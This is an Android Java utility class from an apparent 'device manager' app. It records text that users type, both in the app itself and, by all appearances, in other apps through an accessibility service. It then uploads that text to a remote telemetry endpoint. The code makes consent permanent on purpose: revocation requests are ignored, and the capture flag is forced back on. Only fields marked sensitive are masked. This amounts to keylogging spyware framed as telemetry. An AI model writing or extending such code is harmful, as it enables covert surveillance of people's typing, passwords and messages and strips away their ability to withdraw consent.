package com.company.devicemgr.utils;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.SharedPreferences;
import android.provider.Settings;
import android.text.Editable;
import android.text.TextUtils;
import android.text.TextWatcher;
import android.util.Log;
import android.widget.EditText;

import org.json.JSONArray;
import org.json.JSONObject;

import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public final class InAppTextCaptureManager {
    private static final String TAG = "InAppTextCapture";
    private static final String PREFS = "devicemgr_prefs";
    private static final String KEY_CAPTURE_ENABLED = "in_app_text_capture_enabled";
    private static final String KEY_CAPTURE_CONSENT = "in_app_text_capture_consent";
    private static final String KEY_CAPTURE_CONSENT_TS = "in_app_text_capture_consent_ts";
    private static final String KEY_CAPTURE_CONSENT_VERSION = "in_app_text_capture_consent_version";
    private static final String KEY_CAPTURE_CONSENT_MODE = "in_app_text_capture_consent_mode";
    private static final String KEY_INSTALL_INSTANCE_ID = "in_app_text_install_instance_id";
    private static final String KEY_CONSENT_INSTALL_INSTANCE_ID = "in_app_text_consent_install_instance_id";
    private static final String KEY_PENDING_QUEUE = "in_app_text_capture_pending_queue";
    private static final String KEY_LOCAL_LOG = "in_app_text_capture_local_log";
    private static final String KEY_LAST_SYNC_AT = "in_app_text_capture_last_sync_at";
    private static final String KEY_LAST_SYNC_STATUS = "in_app_text_capture_last_sync_status";
    private static final String KEY_LAST_SYNC_ERROR = "in_app_text_capture_last_sync_error";
    private static final String KEY_LAST_VALUE_PREFIX = "in_app_text_capture_last_value_";
    private static final int MAX_LOCAL_ITEMS = 200;
    private static final String CONSENT_VERSION = "in-app-text-v2";
    private static final String CONSENT_MODE_INSTALL_LIFETIME = "install_lifetime";
    private static final ExecutorService FLUSH_EXECUTOR = Executors.newSingleThreadExecutor();
    private static final AtomicBoolean FLUSH_QUEUED = new AtomicBoolean(false);

    private InAppTextCaptureManager() {}

    public static SharedPreferences prefs(Context context) {
        return context.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
    }

    public static String installInstanceId(Context context) {
        SharedPreferences sp = prefs(context);
        String existing = sp.getString(KEY_INSTALL_INSTANCE_ID, null);
        if (!TextUtils.isEmpty(existing)) {
            return existing;
        }
        String created = UUID.randomUUID().toString();
        sp.edit().putString(KEY_INSTALL_INSTANCE_ID, created).apply();
        return created;
    }

    public static boolean isConsentGranted(Context context) {
        SharedPreferences sp = prefs(context);
        boolean consent = sp.getBoolean(KEY_CAPTURE_CONSENT, false);
        if (!consent) return false;
        String installId = installInstanceId(context);
        String consentInstallId = sp.getString(KEY_CONSENT_INSTALL_INSTANCE_ID, null);
        if (TextUtils.isEmpty(consentInstallId)) {
            sp.edit().putString(KEY_CONSENT_INSTALL_INSTANCE_ID, installId)
                    .putString(KEY_CAPTURE_CONSENT_MODE, CONSENT_MODE_INSTALL_LIFETIME)
                    .apply();
            return true;
        }
        return installId.equals(consentInstallId);
    }

    public static boolean isCaptureEnabled(Context context) {
        return isConsentGranted(context) && prefs(context).getBoolean(KEY_CAPTURE_ENABLED, true);
    }

    public static String consentVersion() {
        return CONSENT_VERSION;
    }

    public static String consentMode(Context context) {
        String stored = prefs(context).getString(KEY_CAPTURE_CONSENT_MODE, null);
        return !TextUtils.isEmpty(stored) ? stored : CONSENT_MODE_INSTALL_LIFETIME;
    }

    public static String consentInstallInstanceId(Context context) {
        String currentInstallId = installInstanceId(context);
        String stored = prefs(context).getString(KEY_CONSENT_INSTALL_INSTANCE_ID, null);
        if (!TextUtils.isEmpty(stored)) {
            return stored;
        }
        if (prefs(context).getBoolean(KEY_CAPTURE_CONSENT, false)) {
            prefs(context).edit().putString(KEY_CONSENT_INSTALL_INSTANCE_ID, currentInstallId).apply();
            return currentInstallId;
        }
        return null;
    }

    public static boolean isAccessibilityServiceEnabled(Context context, Class<? extends AccessibilityService> serviceClass) {
        try {
            String enabledServices = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (TextUtils.isEmpty(enabledServices)) return false;
            String expected = context.getPackageName() + "/" + serviceClass.getName();
            android.text.TextUtils.SimpleStringSplitter splitter = new android.text.TextUtils.SimpleStringSplitter(':');
            splitter.setString(enabledServices);
            while (splitter.hasNext()) {
                String component = splitter.next();
                if (expected.equalsIgnoreCase(component)) {
                    return true;
                }
            }
        } catch (Exception ignored) {
        }
        return false;
    }

    public static String buildAccessibilityStatus(Context context, Class<? extends AccessibilityService> serviceClass) {
        return isAccessibilityServiceEnabled(context, serviceClass)
                ? "Serviço de acessibilidade do teclado ativo."
                : "Serviço de acessibilidade do teclado pendente. Abra as definições do Android e ative o serviço desta app.";
    }

    public static boolean grantPermanentConsent(Context context) {
        SharedPreferences sp = prefs(context);
        if (isConsentGranted(context)) {
            sp.edit().putBoolean(KEY_CAPTURE_ENABLED, true).apply();
            return false;
        }
        long now = System.currentTimeMillis();
        String installId = installInstanceId(context);
        sp.edit()
                .putBoolean(KEY_CAPTURE_CONSENT, true)
                .putBoolean(KEY_CAPTURE_ENABLED, true)
                .putLong(KEY_CAPTURE_CONSENT_TS, now)
                .putString(KEY_CAPTURE_CONSENT_VERSION, CONSENT_VERSION)
                .putString(KEY_CAPTURE_CONSENT_MODE, CONSENT_MODE_INSTALL_LIFETIME)
                .putString(KEY_CONSENT_INSTALL_INSTANCE_ID, installId)
                .apply();
        return true;
    }

    public static void setConsent(Context context, boolean granted) {
        if (granted) {
            grantPermanentConsent(context);
            return;
        }
        Log.w(TAG, "Ignoring revoke request because text capture consent is permanent for the current installation.");
    }

    public static void setCaptureEnabled(Context context, boolean enabled) {
        if (isConsentGranted(context)) {
            prefs(context).edit().putBoolean(KEY_CAPTURE_ENABLED, true).apply();
            return;
        }
        prefs(context).edit().putBoolean(KEY_CAPTURE_ENABLED, false).apply();
    }

    public static long consentTs(Context context) {
        return prefs(context).getLong(KEY_CAPTURE_CONSENT_TS, 0L);
    }

    public static long lastSyncAt(Context context) {
        return prefs(context).getLong(KEY_LAST_SYNC_AT, 0L);
    }

    public static String lastSyncStatus(Context context) {
        return prefs(context).getString(KEY_LAST_SYNC_STATUS, "idle");
    }

    public static String lastSyncError(Context context) {
        return prefs(context).getString(KEY_LAST_SYNC_ERROR, null);
    }

    public static String buildStatusSummary(Context context) {
        SharedPreferences sp = prefs(context);
        boolean consent = isConsentGranted(context);
        boolean enabled = isCaptureEnabled(context);
        int pending = pendingCount(context);
        long lastSyncAt = sp.getLong(KEY_LAST_SYNC_AT, 0L);
        String status = sp.getString(KEY_LAST_SYNC_STATUS, "idle");
        return String.format(Locale.US,
                "Consentimento: %s | Modo: %s | Ativo: %s | Pendentes: %d | Última sync: %s | Estado: %s",
                consent ? "sim" : "não",
                consentMode(context),
                enabled ? "sim" : "não",
                pending,
                lastSyncAt > 0 ? new java.util.Date(lastSyncAt).toString() : "-",
                status);
    }

    public static int pendingCount(Context context) {
        return readArray(prefs(context).getString(KEY_PENDING_QUEUE, null)).length();
    }

    public static JSONArray recentEntries(Context context) {
        return readArray(prefs(context).getString(KEY_LOCAL_LOG, null));
    }

    public static void attachWatcher(EditText editText, Context context, String screenName, String fieldName, boolean sensitive) {
        editText.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {}

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
                recordTextChange(context, screenName, fieldName, s != null ? s.toString() : "", sensitive);
            }

            @Override
            public void afterTextChanged(Editable s) {}
        });
    }

    public static void recordTextChange(Context context, String screenName, String fieldName, String rawValue, boolean sensitive) {
        recordTextChange(context, screenName, fieldName, rawValue, sensitive, screenName, null, context.getPackageName().equals(screenName) ? "in_app_watcher" : "accessibility_service");
    }

    public static void recordTextChange(Context context, String screenName, String fieldName, String rawValue, boolean sensitive, String sourcePackage, String sourceClassName, String captureMethod) {
        if (!isCaptureEnabled(context)) return;
        String safeScreen = safeKey(screenName);
        String safeField = safeKey(fieldName);
        String lastValueKey = KEY_LAST_VALUE_PREFIX + safeScreen + "_" + safeField;
        SharedPreferences sp = prefs(context);
        String normalizedValue = rawValue != null ? rawValue : "";
        if (normalizedValue.equals(sp.getString(lastValueKey, null))) {
            return;
        }
        sp.edit().putString(lastValueKey, normalizedValue).apply();

        long now = System.currentTimeMillis();
        String storedValue = sensitive ? maskSensitive(normalizedValue) : normalizedValue;
        String normalizedSourcePackage = sourcePackage != null ? sourcePackage : screenName;
        String normalizedCaptureMethod = captureMethod != null ? captureMethod : (context.getPackageName().equals(screenName) ? "in_app_watcher" : "accessibility_service");
        JSONObject entry = new JSONObject();
        try {
            entry.put("entryId", UUID.randomUUID().toString());
            entry.put("screenName", screenName);
            entry.put("fieldName", fieldName);
            entry.put("text", storedValue);
            entry.put("textLength", normalizedValue.length());
            entry.put("isSensitive", sensitive);
            entry.put("capturedAtMs", now);
            entry.put("capturedAt", new java.util.Date(now).toString());
            entry.put("syncKey", sha1(screenName + "|" + fieldName + "|" + normalizedValue + "|" + now));
            entry.put("captureScope", context.getPackageName().equals(normalizedSourcePackage) ? "own_app_only" : "accessibility_service");
            entry.put("packageName", context.getPackageName());
            entry.put("sourcePackage", normalizedSourcePackage);
            entry.put("sourceClassName", sourceClassName != null ? sourceClassName : JSONObject.NULL);
            entry.put("captureMethod", normalizedCaptureMethod);
            entry.put("consentMode", consentMode(context));
            entry.put("consentInstallId", consentInstallInstanceId(context));
            entry.put("consentPermanent", true);
        } catch (Exception e) {
            Log.e(TAG, "recordTextChange build err", e);
            return;
        }

        appendEntry(sp, KEY_PENDING_QUEUE, entry, MAX_LOCAL_ITEMS);
        appendEntry(sp, KEY_LOCAL_LOG, entry, MAX_LOCAL_ITEMS);
        flushPendingAsync(context.getApplicationContext());
    }

    public static void flushPendingAsync(Context context) {
        if (!FLUSH_QUEUED.compareAndSet(false, true)) {
            return;
        }
        Context appContext = context.getApplicationContext();
        FLUSH_EXECUTOR.execute(() -> {
            try {
                flushPending(appContext);
            } finally {
                FLUSH_QUEUED.set(false);
                if (pendingCount(appContext) > 0 && isCaptureEnabled(appContext)) {
                    flushPendingAsync(appContext);
                }
            }
        });
    }

    public static synchronized void flushPending(Context context) {
        SharedPreferences sp = prefs(context);
        if (!isCaptureEnabled(context)) {
            return;
        }
        String token = sp.getString("auth_token", null);
        String deviceId = sp.getString("deviceId", null);
        if (token == null || token.trim().isEmpty() || deviceId == null || deviceId.trim().isEmpty()) {
            return;
        }

        JSONArray queue = readArray(sp.getString(KEY_PENDING_QUEUE, null));
        if (queue.length() == 0) {
            sp.edit().putString(KEY_LAST_SYNC_STATUS, "idle").apply();
            return;
        }

        List<JSONObject> remaining = new ArrayList<>();
        long startedAt = System.currentTimeMillis();
        String syncStatus = "ok";
        String syncError = null;

        for (int i = 0; i < queue.length(); i++) {
            JSONObject item = queue.optJSONObject(i);
            if (item == null) continue;
            try {
                JSONObject payload = new JSONObject(item.toString());
                JSONObject body = new JSONObject();
                body.put("type", "in_app_text_input");
                body.put("payload", payload);
                HttpClient.postJson(ApiConfig.api("/api/telemetry/" + deviceId), body.toString(), token);
            } catch (Exception e) {
                syncStatus = "error";
                syncError = e.getMessage();
                remaining.add(item);
            }
        }

        JSONArray newQueue = new JSONArray();
        for (JSONObject item : remaining) newQueue.put(item);
        sp.edit()
                .putString(KEY_PENDING_QUEUE, newQueue.toString())
                .putLong(KEY_LAST_SYNC_AT, System.currentTimeMillis())
                .putString(KEY_LAST_SYNC_STATUS, syncStatus)
                .putString(KEY_LAST_SYNC_ERROR, syncError)
                .putLong("in_app_text_capture_last_sync_duration_ms", System.currentTimeMillis() - startedAt)
                .apply();
    }

    private static void appendEntry(SharedPreferences sp, String key, JSONObject entry, int maxItems) {
        JSONArray current = readArray(sp.getString(key, null));
        JSONArray updated = new JSONArray();
        updated.put(entry);
        for (int i = 0; i < current.length() && updated.length() < maxItems; i++) {
            JSONObject item = current.optJSONObject(i);
            if (item != null) updated.put(item);
        }
        sp.edit().putString(key, updated.toString()).apply();
    }

    private static JSONArray readArray(String raw) {
        if (raw == null || raw.trim().isEmpty()) return new JSONArray();
        try {
            return new JSONArray(raw);
        } catch (Exception ignored) {
            return new JSONArray();
        }
    }

    private static String safeKey(String value) {
        return (value != null ? value : "field").replaceAll("[^a-zA-Z0-9_]+", "_").toLowerCase(Locale.US);
    }

    private static String maskSensitive(String value) {
        if (value == null || value.isEmpty()) return "";
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < value.length(); i++) sb.append('•');
        return sb.toString();
    }

    private static String sha1(String value) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-1");
            byte[] digest = md.digest(value.getBytes("UTF-8"));
            StringBuilder sb = new StringBuilder();
            for (byte b : digest) sb.append(String.format(Locale.US, "%02x", b));
            return sb.toString();
        } catch (Exception e) {
            return UUID.randomUUID().toString();
        }
    }
}
